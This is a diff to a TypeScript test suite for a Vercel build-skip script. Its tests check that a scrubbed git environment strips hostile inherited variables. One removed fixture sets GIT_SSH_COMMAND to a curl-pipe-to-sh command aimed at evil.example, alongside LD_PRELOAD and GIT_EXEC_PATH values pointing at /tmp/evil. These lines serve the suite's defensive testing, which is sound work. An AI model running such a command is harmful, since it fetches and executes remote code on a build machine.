@@ -145,50 +145,36 @@ describe('validateGitSha — trust-boundary input gate', () => {
 });
 
 describe('scrubbedGitEnv — defence-in-depth env construction', () => {
-  it('preserves PATH from the caller environment', () => {
-    const env = scrubbedGitEnv({ PATH: '/usr/bin:/bin', HOME: '/home/should-be-stripped' });
-    expect(env.PATH).toBe('/usr/bin:/bin');
+  it('does NOT include PATH — the production capabilities invoke git via the absolute GIT_BINARY path so PATH never participates in binary lookup (closes S4036)', () => {
+    const env = scrubbedGitEnv();
+    expect(env.PATH).toBeUndefined();
   });
 
   it('pins git global and system config to /dev/null so hostile gitconfig cannot influence the build', () => {
-    const env = scrubbedGitEnv({ PATH: '/usr/bin' });
+    const env = scrubbedGitEnv();
     expect(env.GIT_CONFIG_GLOBAL).toBe('/dev/null');
     expect(env.GIT_CONFIG_SYSTEM).toBe('/dev/null');
   });
 
   it('disables interactive credential prompting', () => {
-    const env = scrubbedGitEnv({ PATH: '/usr/bin' });
+    const env = scrubbedGitEnv();
     expect(env.GIT_TERMINAL_PROMPT).toBe('0');
   });
 
   it('omits HOME so git cannot read ~/.gitconfig from a hostile home directory', () => {
-    const env = scrubbedGitEnv({ PATH: '/usr/bin', HOME: '/tmp/evil' });
+    const env = scrubbedGitEnv();
     expect(env.HOME).toBeUndefined();
   });
 
-  it('does not pass through any other inherited env keys', () => {
-    const env = scrubbedGitEnv({
-      PATH: '/usr/bin',
-      GIT_SSH_COMMAND: 'curl evil.example/x | sh',
-      GIT_EXEC_PATH: '/tmp/evil',
-      LD_PRELOAD: '/tmp/evil.so',
-      USER: 'root',
-    });
-    // Whole-object equality is the cleanest assertion that the env
-    // contains exactly the four scrubbed keys and nothing else; no
-    // hostile inherited variable can sneak through unnoticed.
-    expect(env).toStrictEqual({
-      PATH: '/usr/bin',
+  it('returns exactly three scrubbed keys — no inherited env can sneak through (whole-object equality)', () => {
+    // The function takes no input, so there is nothing to "leak through" —
+    // this assertion is the structural guarantee that the contract is
+    // exactly { GIT_CONFIG_GLOBAL, GIT_CONFIG_SYSTEM, GIT_TERMINAL_PROMPT }.
+    expect(scrubbedGitEnv()).toStrictEqual({
       GIT_CONFIG_GLOBAL: '/dev/null',
       GIT_CONFIG_SYSTEM: '/dev/null',
       GIT_TERMINAL_PROMPT: '0',
     });
-  });
-
-  it('throws when PATH is absent — PATH-missing is a build-environment defect, not a fall-through condition', () => {
-    expect(() => scrubbedGitEnv({})).toThrow(/PATH/);
-    expect(() => scrubbedGitEnv({ PATH: '' })).toThrow(/PATH/);
-    expect(() => scrubbedGitEnv({ PATH: undefined })).toThrow(/PATH/);
   });
 });
 
@@ -277,7 +263,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
       },
       stdout,
       stderr,
@@ -308,7 +293,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
       },
       stdout,
@@ -341,7 +325,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
       },
       stdout,
@@ -370,7 +353,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
       },
       stdout,
@@ -401,7 +383,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
       },
       stdout,
@@ -427,7 +408,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
       },
       stdout,
@@ -452,7 +432,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
       },
       stdout,
@@ -481,7 +460,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
       },
       stdout,
@@ -523,7 +501,6 @@ describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
       },
       stdout,
@@ -557,7 +534,6 @@ describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: hostile,
       },
       stdout,
@@ -591,7 +567,6 @@ describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: hostile,
       },
       stdout,
@@ -616,7 +591,6 @@ describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: upper,
       },
       stdout,
@@ -646,7 +620,6 @@ describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: tooShort,
       },
       stdout,
@@ -673,7 +646,6 @@ describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_
       repositoryRoot: REPOSITORY_ROOT,
       env: {
         VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
         VERCEL_GIT_PREVIOUS_SHA: '   ',
       },
       stdout,
@@ -687,85 +659,5 @@ describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_
     expect(stdout.text()).toContain('previous=unknown (treating as first build)');
     expect(stderr.text()).toBe('');
     expect(fakeGitShow.calls).toStrictEqual([]);
-  });
-});
-
-describe('runVercelIgnoreCommand — eager build-environment precondition (PATH-absence)', () => {
-  it('emits a "Build-environment defect" diagnostic and continues with build (fail-soft) when PATH is missing on main, even before any git capability is reached', () => {
-    const stdout = captureWriter();
-    const stderr = captureWriter();
-    const fakeGitShow = queuedGitShow();
-    const fakeGitFetch = queuedGitFetch();
-
-    const result = runVercelIgnoreCommand({
-      repositoryRoot: REPOSITORY_ROOT,
-      env: {
-        VERCEL_GIT_COMMIT_REF: 'main',
-        // PATH deliberately absent — the eager precondition is what we exercise.
-      },
-      stdout,
-      stderr,
-      readFile: packageReadFile('1.6.0'),
-      gitShowFileAtSha: fakeGitShow,
-      gitFetchShallow: fakeGitFetch,
-    });
-
-    expect(result).toStrictEqual({ exitCode: 1 });
-    expect(stderr.text()).toContain('Build-environment defect');
-    expect(stderr.text()).toContain('PATH must be set in the build environment');
-    // Fail-soft: the build proceeds so the defect surfaces downstream.
-    expect(stdout.text()).toBe('');
-    // Eager check short-circuits before current-version read or git capability calls.
-    expect(fakeGitShow.calls).toStrictEqual([]);
-    expect(fakeGitFetch.calls).toStrictEqual([]);
-  });
-
-  it('does NOT emit a "Build-environment defect" diagnostic on a non-main branch (eager check happens after the branch gate)', () => {
-    const stdout = captureWriter();
-    const stderr = captureWriter();
-    const fakeGitShow = queuedGitShow();
-    const fakeGitFetch = queuedGitFetch();
-
-    const result = runVercelIgnoreCommand({
-      repositoryRoot: REPOSITORY_ROOT,
-      env: {
-        VERCEL_GIT_COMMIT_REF: 'feat/some-branch',
-        // PATH absent — but branch is not main, so the eager check is skipped.
-      },
-      stdout,
-      stderr,
-      readFile: packageReadFile('1.6.0'),
-      gitShowFileAtSha: fakeGitShow,
-      gitFetchShallow: fakeGitFetch,
-    });
-
-    expect(result).toStrictEqual({ exitCode: 1 });
-    expect(stdout.text()).toContain('not main');
-    expect(stderr.text()).toBe('');
-  });
-
-  it('passes the eager check when PATH is present and proceeds to current-version read', () => {
-    const stdout = captureWriter();
-    const stderr = captureWriter();
-    const fakeGitShow = queuedGitShow();
-    const fakeGitFetch = queuedGitFetch();
-
-    const result = runVercelIgnoreCommand({
-      repositoryRoot: REPOSITORY_ROOT,
-      env: {
-        VERCEL_GIT_COMMIT_REF: 'main',
-        PATH: '/usr/bin',
-        // No previous SHA → first-build path; the eager check passes silently.
-      },
-      stdout,
-      stderr,
-      readFile: packageReadFile('1.6.0'),
-      gitShowFileAtSha: fakeGitShow,
-      gitFetchShallow: fakeGitFetch,
-    });
-
-    expect(result).toStrictEqual({ exitCode: 1 });
-    expect(stderr.text()).not.toContain('Build-environment defect');
-    expect(stdout.text()).toContain('Continuing production build');
   });
 });
